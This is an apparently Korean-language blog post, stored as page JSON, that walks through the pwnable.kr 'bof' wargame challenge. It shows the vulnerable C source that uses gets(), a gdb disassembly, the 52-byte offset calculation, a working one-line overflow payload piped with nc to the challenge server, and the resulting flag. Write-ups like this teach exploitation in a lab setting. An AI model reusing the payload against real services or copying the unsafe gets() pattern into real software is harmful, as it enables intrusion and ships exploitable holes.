{"pageProps":{"post":{"slug":"2017-08-30-pwnable-bof copy","content":"\n![](/assets/posts/pwnkr/bof.png)\n\n이름만 봐도 알 수 있는 buffer overflow 문제!\n코드는 다음과 같다.\n\n```c\n#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n\nvoid func(int key){\n\tchar overflowme[32];\n\tprintf(\"overflow me : \");\n\tgets(overflowme);\t// smash me!\n\tif(key == 0xcafebabe){\n\t\tsystem(\"/bin/sh\");\n\t}\n\telse{\n\t\tprintf(\"Nah..\\n\");\n\t}\n}\n\nint main(int argc, char* argv[]){\n\tfunc(0xdeadbeef);\n\treturn 0;\n}\n```\n\ngets함수 부분에 주석으로 smash me!가 있는걸 보니 gets 함수의 취약점을 이용한 bof인 듯 하다.\nmain에서 0xdeadbeef 값을 func에 넘겨주고 함수가 실행되는데 `key = 0xdeadbeef` 이고\nuser로 부터 변수 overflowme를 받은 후 `key가 0xcafebabe 과 일치할 때` 쉘을 실행시킨다.\n그럼 어떻게 해야될까 gdb로 한 번 봐 보자\n\n```\nmitny@argos-edu:~/pwnable$ gdb -q bof\nReading symbols from bof...(no debugging symbols found)...done.\n(gdb) set disassembly-flavor intel\n(gdb) disas main\nDump of assembler code for function main:\n   0x0000068a <+0>:\tpush   ebp\n   0x0000068b <+1>:\tmov    ebp,esp\n   0x0000068d <+3>:\tand    esp,0xfffffff0\n   0x00000690 <+6>:\tsub    esp,0x10\n   0x00000693 <+9>:\tmov    DWORD PTR [esp],0xdeadbeef\n   0x0000069a <+16>:\tcall   0x62c < func>\n   0x0000069f <+21>:\tmov    eax,0x0\n   0x000006a4 <+26>:\tleave  \n   0x000006a5 <+27>:\tret    \nEnd of assembler dump.\n(gdb) disas func\nDump of assembler code for function func:\n   0x0000062c <+0>:\tpush   ebp\n   0x0000062d <+1>:\tmov    ebp,esp\n   0x0000062f <+3>:\tsub    esp,0x48\n   0x00000632 <+6>:\tmov    eax,gs:0x14\n   0x00000638 <+12>:\tmov    DWORD PTR [ebp-0xc],eax\n   0x0000063b <+15>:\txor    eax,eax\n   0x0000063d <+17>:\tmov    DWORD PTR [esp],0x78c\n   0x00000644 <+24>:\tcall   0x645 < func+25>\n   0x00000649 <+29>:\tlea    eax,[ebp-0x2c]\n   0x0000064c <+32>:\tmov    DWORD PTR [esp],eax\n   0x0000064f <+35>:\tcall   0x650 < func+36>\n   0x00000654 <+40>:\tcmp    DWORD PTR [ebp+0x8],0xcafebabe\n   0x0000065b <+47>:\tjne    0x66b < func+63>\n   0x0000065d <+49>:\tmov    DWORD PTR [esp],0x79b\n   0x00000664 <+56>:\tcall   0x665 < func+57>\n   0x00000669 <+61>:\tjmp    0x677 < func+75>\n   0x0000066b <+63>:\tmov    DWORD PTR [esp],0x7a3\n   0x00000672 <+70>:\tcall   0x673 < func+71>\n   0x00000677 <+75>:\tmov    eax,DWORD PTR [ebp-0xc]\n   0x0000067a <+78>:\txor    eax,DWORD PTR gs:0x14\n   0x00000681 <+85>:\tje     0x688 < func+92>\n   0x00000683 <+87>:\tcall   0x684 < func+88>\n   0x00000688 <+92>:\tleave  \n   0x00000689 <+93>:\tret    \nEnd of assembler dump.\n```\n`0x00000654 <+40>:\tcmp    DWORD PTR [ebp+0x8],0xcafebabe `\n이 부분에서 ebp+0x8 에 있는 값과 0xcafebabe 를 비교해서 \n일치하지 않으면 func+63 으로 jump, 일치하면 func+75로 jump를 하게 되는데\n\n[ebp-0x2c] 와 [ebp+0x8] 사이의 거리는 52!\n즉, 52바이트 만큼 다른 문자를 채워넣고 0xcafebabe 를 넣어 주면 된다.\n\n`(python -c 'print \"A\"*52+\"\\xbe\\xba\\xfe\\xca\"'; cat) |nc pwnable.kr 9000` 를 해주면\n![](/assets/posts/pwnkr/bof_flag.png)\n\nflag가 뜬다!\n\n`daddy, I just pwned a buFFer :)`\n","layout":"post","title":"[Pwnable.kr] bof","categories":["Pwnable.kr"],"excerpt":" ","comments":true,"share":true,"tags":["Pwnable.kr","bof"]}},"__N_SSG":true}